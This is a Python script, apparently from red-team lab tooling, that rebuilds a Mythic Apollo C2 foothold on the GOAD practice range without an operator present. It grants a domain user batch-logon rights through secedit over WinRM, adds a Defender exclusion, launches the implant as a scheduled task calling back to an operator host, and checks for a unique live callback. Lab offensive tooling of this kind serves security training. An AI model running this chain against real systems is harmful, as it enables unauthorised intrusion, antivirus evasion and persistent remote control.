#!/usr/bin/env python3
"""
sage-foothold-launch — unaided WinRM foothold launch for the GOAD range.

Rebuilds a live Apollo callback as NORTH\\samwell.tarly WITHOUT an operator, an RDP client, or
an X display. It launches the Apollo payload through a WinRM-created scheduled task that runs as
samwell (batch logon) using the Ludus ansible-inventory admin WinRM session — the same exec path
`sync_range_time.py` uses (winrm_session()/run_ps()), the same launch primitive
`deploy_payload_via_ludus.py --launch-method scheduled-task` uses. The prior foothold path
(`launch_apollo_foothold.sh`) needed a live Xwayland/Xvfb display and an xfreerdp3 PTY; this one
needs neither, so a headless agent or cron can rebuild a foothold end to end.

Subcommands:
  rebuild   revert range -> poweron -> clock sync -> launch as samwell -> verify unique live foothold
  launch    launch as samwell against the current (already-booted, clock-synced) range -> verify
  verify    report foothold readiness only (no mutation)

All state-changing steps are explicit and named. Nothing here touches Mythic's records; the worst
case is a range restorable by `ludus snapshots revert` (49R-03). Uniqueness is gated: if more than
one new live Apollo callback appears, the attempt is reported non-countable rather than guessed.

Evidence discipline: readiness is probed by execution (native_chat inspect), never introspected.
An empty or ambiguous callback set is a FAILURE, not a pass.
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
PY = str(REPO / ".venv" / "bin" / "python")
CERT = str(REPO / "Payload_Type" / "sage" / "certs" / "combined-bundle.pem")
SAGE_ENV = REPO / "Payload_Type" / "sage" / ".env"

LUDUS = "skills/sage-goad-reset/scripts/ludus.py"
CLOCK = "skills/sage-goad-reset/scripts/sync_range_time.py"
DEPLOY = "skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py"
INSPECT = "skills/sage-live-runner/scripts/native_chat.py"

DEFAULT_SNAPSHOT = "isc49r-scored-20260726"
DEFAULT_TARGET_HOST = "CASTELBLACK"
DEFAULT_TARGET_IP = "10.4.10.22"
DEFAULT_RUN_AS = "NORTH\\samwell.tarly"
DEFAULT_SERVE_HOST = os.environ.get("SAGE_SERVE_HOST", "100.108.59.85")  # operator Tailscale IP


def _env() -> dict:
    env = dict(os.environ)
    env["SSL_CERT_FILE"] = CERT
    # Source SAGE_RUN_AS_PASSWORD from Sage .env if not already exported (single source of truth).
    if not env.get("SAGE_RUN_AS_PASSWORD") and SAGE_ENV.exists():
        for line in SAGE_ENV.read_text(encoding="utf-8").splitlines():
            s = line.strip()
            if s.startswith("SAGE_RUN_AS_PASSWORD="):
                env["SAGE_RUN_AS_PASSWORD"] = s.split("=", 1)[1].strip().strip("'\"")
                break
    return env


def run(cmd: list[str], *, timeout: int, capture: bool = True) -> dict:
    """Run a repo CLI; return {rc, stdout, stderr, json?}. Streams to our stderr when capture=False."""
    started = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    try:
        proc = subprocess.run(
            cmd, cwd=str(REPO), env=_env(), timeout=timeout,
            capture_output=capture, text=True,
        )
    except subprocess.TimeoutExpired as exc:
        return {"cmd": cmd, "rc": None, "timeout": True, "started": started,
                "stdout": (exc.stdout or "")[-4000:] if capture else "", "stderr": str(exc)[:1000]}
    out = {"cmd": cmd, "rc": proc.returncode, "started": started}
    if capture:
        out["stdout"] = (proc.stdout or "")[-8000:]
        out["stderr"] = (proc.stderr or "")[-2000:]
        try:
            txt = proc.stdout or ""
            out["json"] = json.loads(txt[txt.index("{"):]) if "{" in txt else None
        except Exception:
            out["json"] = None
    return out


_GRANT_BATCH_RIGHT_PS = r"""
$ErrorActionPreference='Stop'
$acct='{acct}'
$sid=(New-Object System.Security.Principal.NTAccount($acct)).Translate([System.Security.Principal.SecurityIdentifier]).Value
$cfg="$env:TEMP\sp.inf"; $db="$env:TEMP\sp.sdb"
secedit /export /cfg $cfg /areas USER_RIGHTS | Out-Null
$lines=Get-Content $cfg
$m=$lines | Select-String -Pattern '^SeBatchLogonRight'
if($m){{
  $i=$m.LineNumber-1
  if($lines[$i] -notmatch [regex]::Escape($sid)){{ $lines[$i]=$lines[$i]+",*$sid" }}
}} else {{
  $pr=($lines | Select-String -Pattern '^\[Privilege Rights\]').LineNumber
  $lines=@($lines[0..($pr-1)]) + ("SeBatchLogonRight = *$sid") + @($lines[$pr..($lines.Count-1)])
}}
Set-Content $cfg $lines
secedit /configure /db $db /cfg $cfg /areas USER_RIGHTS | Out-Null
secedit /export /cfg "$env:TEMP\sp2.inf" /areas USER_RIGHTS | Out-Null
$after=(Get-Content "$env:TEMP\sp2.inf" | Select-String '^SeBatchLogonRight')
[PSCustomObject]@{{ sid=$sid; granted=($after -match [regex]::Escape($sid)); line=$after.ToString() }} | ConvertTo-Json -Compress
"""


def grant_batch_logon_right(target_ip: str, run_as_user: str) -> dict:
    """Grant SeBatchLogonRight to the run-as (domain) user on the target over the Ludus WinRM admin
    session, so a batch-logon scheduled task can start as that user. Reversible, range-local; a member
    server otherwise denies `Log on as a batch job` to a standard domain account."""
    import sys as _sys
    _sys.path.insert(0, str(REPO / "skills" / "sage-goad-reset" / "scripts"))
    import sync_range_time as srt
    inv = srt.load_inventory(REPO / ".mcp.json")
    host = None
    for h in srt.windows_hosts(inv):
        if str(h.get("ansible_host")) == target_ip:
            host = h
            break
    if host is None:
        return {"granted": None, "error": f"no inventory host with ip {target_ip}"}
    resp = srt.run_ps(srt.winrm_session(host), _GRANT_BATCH_RIGHT_PS.format(acct=run_as_user))
    try:
        return json.loads(resp["stdout"])
    except Exception:
        return {"granted": None, "raw": (resp.get("stdout") or "")[:400], "err": (resp.get("stderr") or "")[:400]}


def inspect_foothold(timeout: int = 180) -> dict:
    r = run([PY, INSPECT, "inspect"], timeout=timeout)
    j = r.get("json") or {}
    foothold = j.get("foothold") or {}
    return {
        "ready": bool(foothold.get("ready")),
        "selected_foothold_cb": foothold.get("selected_foothold_cb"),
        "duplicate_live_footholds": foothold.get("duplicate_live_footholds"),
        "callbacks": foothold.get("callbacks"),
        "clock_ready": (j.get("clock") or {}).get("ready"),
        "raw_rc": r.get("rc"),
    }


def do_verify(args) -> dict:
    return {"step": "verify", "foothold": inspect_foothold()}


def do_launch(args) -> dict:
    steps = []
    # Baseline live Apollo callbacks before the launch, so uniqueness is measured, not assumed.
    before = inspect_foothold()
    before_live = {c["display_id"] for c in (before.get("callbacks") or []) if c.get("live")}
    steps.append({"pre_launch_foothold": before})

    # A member server denies "Log on as a batch job" to a standard domain user, so a
    # `schtasks /RU <domain-user> /RP` task registers but never starts. Grant the right first over the
    # WinRM admin session; this is the pure-WinRM equivalent of the RDP interactive logon.
    if not args.no_grant_batch_right:
        grant = grant_batch_logon_right(args.target_ip, args.run_as_user)
        steps.append({"grant_batch_logon_right": grant})

    deploy_cmd = [
        PY, DEPLOY, "deploy",
        "--payload-type", "apollo",
        "--target-host", args.target_host,
        "--target-ip", args.target_ip,
        "--serve-host", args.serve_host,
        "--run-as-user", args.run_as_user,
        "--launch-method", "scheduled-task",
        "--add-defender-exclusion",
        "--run-as-password-env", "SAGE_RUN_AS_PASSWORD",
        "--wait-callbacks-seconds", str(args.wait_callbacks_seconds),
    ]
    # A domain scheduled task can fail to register while the DC is still servicing netlogon after
    # a cold boot; retry the whole deploy a bounded number of times rather than treat the first
    # transient failure as terminal.
    deploy_result = None
    for attempt in range(1, args.launch_attempts + 1):
        deploy_result = run(deploy_cmd, timeout=args.deploy_timeout)
        j = deploy_result.get("json") or {}
        new_cbs = j.get("new_callbacks") or []
        steps.append({"deploy_attempt": attempt, "rc": deploy_result.get("rc"),
                      "new_callbacks": new_cbs,
                      "stderr_tail": (deploy_result.get("stderr") or "")[-600:]})
        if deploy_result.get("rc") == 0 and new_cbs:
            break
        # Authoritative guard against creating a DUPLICATE foothold on retry: a batch-logon Apollo
        # can check in AFTER the deploy's own wait window. Re-probe by execution before retrying;
        # if a new live callback already exists, stop — a second deploy would create a duplicate.
        probe = inspect_foothold()
        probe_new = {c["display_id"] for c in (probe.get("callbacks") or []) if c.get("live")} - before_live
        if probe_new:
            steps.append({"retry_averted": "new live callback appeared after deploy wait",
                          "new_live": sorted(probe_new)})
            break
        if attempt < args.launch_attempts:
            time.sleep(args.retry_sleep)

    # Verify a UNIQUE new live Apollo foothold by execution.
    settle_deadline = time.monotonic() + args.settle_seconds
    after = inspect_foothold()
    while time.monotonic() < settle_deadline:
        after = inspect_foothold()
        after_live = {c["display_id"] for c in (after.get("callbacks") or []) if c.get("live")}
        new_live = sorted(after_live - before_live)
        if after.get("ready") and len(new_live) >= 1:
            break
        time.sleep(args.poll_interval)
    after_live = {c["display_id"] for c in (after.get("callbacks") or []) if c.get("live")}
    new_live = sorted(after_live - before_live)

    verdict = "unknown"
    if after.get("ready") and len(new_live) == 1 and not after.get("duplicate_live_footholds"):
        verdict = "unique_live_foothold"
    elif len(new_live) > 1 or after.get("duplicate_live_footholds"):
        verdict = "non_countable_multiple_footholds"
    elif not new_live:
        verdict = "no_new_foothold"
    steps.append({"post_launch_foothold": after, "new_live_callbacks": new_live, "verdict": verdict})
    return {"step": "launch", "verdict": verdict, "new_live_callbacks": new_live, "steps": steps}


def _vms_on(status_stdout: str) -> int:
    """Count range VM lines reporting ON (status prints one `  ON  <name>` line per VM)."""
    n = 0
    for line in (status_stdout or "").splitlines():
        toks = line.strip().split()
        if toks and toks[0] == "ON":
            n += 1
    return n


def do_rebuild(args) -> dict:
    steps = []
    rb = run([PY, LUDUS, "rollback", args.snapshot, "--yes"], timeout=600)
    steps.append({"rollback": {"rc": rb.get("rc"), "out": (rb.get("stdout") or "")[-400:],
                               "err": (rb.get("stderr") or "")[-300:]}})
    po = run([PY, LUDUS, "poweron", "all"], timeout=600)
    steps.append({"poweron": {"rc": po.get("rc"), "out": (po.get("stdout") or "")[-300:]}})
    # Wait for all six VMs to report ON before touching WinRM.
    on_deadline = time.monotonic() + args.boot_wait_seconds
    vms_on = 0
    while time.monotonic() < on_deadline:
        st = run([PY, LUDUS, "status"], timeout=120)
        vms_on = _vms_on(st.get("stdout") or "")
        if vms_on >= 6:
            break
        time.sleep(args.poll_interval)
    steps.append({"vms_on_wait": {"vms_on": vms_on}})
    # Clock sync (Kerberos/domain auth for the samwell scheduled task depends on it). Retry until ready.
    clock = None
    clk_deadline = time.monotonic() + args.clock_wait_seconds
    while time.monotonic() < clk_deadline:
        clock = run([PY, CLOCK, "sync", "--yes"], timeout=300)
        cj = clock.get("json") or {}
        if cj.get("ready"):
            break
        time.sleep(args.retry_sleep)
    steps.append({"clock_sync": (clock or {}).get("json") or "no-json"})
    launch = do_launch(args)
    return {"step": "rebuild", "snapshot": args.snapshot, "reset_steps": steps, "launch": launch,
            "verdict": launch.get("verdict")}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Unaided WinRM foothold launch for the GOAD range.")
    sub = p.add_subparsers(dest="command", required=True)
    for name in ("rebuild", "launch", "verify"):
        sp = sub.add_parser(name)
        sp.add_argument("--snapshot", default=DEFAULT_SNAPSHOT)
        sp.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
        sp.add_argument("--target-ip", default=DEFAULT_TARGET_IP)
        sp.add_argument("--run-as-user", default=DEFAULT_RUN_AS)
        sp.add_argument("--serve-host", default=DEFAULT_SERVE_HOST)
        sp.add_argument("--wait-callbacks-seconds", type=int, default=150)
        sp.add_argument("--deploy-timeout", type=int, default=600)
        sp.add_argument("--launch-attempts", type=int, default=3)
        sp.add_argument("--retry-sleep", type=int, default=30)
        sp.add_argument("--settle-seconds", type=int, default=120)
        sp.add_argument("--poll-interval", type=int, default=10)
        sp.add_argument("--boot-wait-seconds", type=int, default=300)
        sp.add_argument("--clock-wait-seconds", type=int, default=300)
        sp.add_argument("--no-grant-batch-right", action="store_true",
                        help="skip granting SeBatchLogonRight to the run-as user before the batch launch")
    return p


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    fn = {"rebuild": do_rebuild, "launch": do_launch, "verify": do_verify}[args.command]
    result = fn(args)
    print(json.dumps(result, indent=2, sort_keys=True, default=str))
    verdict = result.get("verdict") or (result.get("foothold") or {}).get("ready")
    if args.command == "verify":
        return 0 if (result.get("foothold") or {}).get("ready") else 1
    return 0 if verdict == "unique_live_foothold" else 1


if __name__ == "__main__":
    raise SystemExit(main())
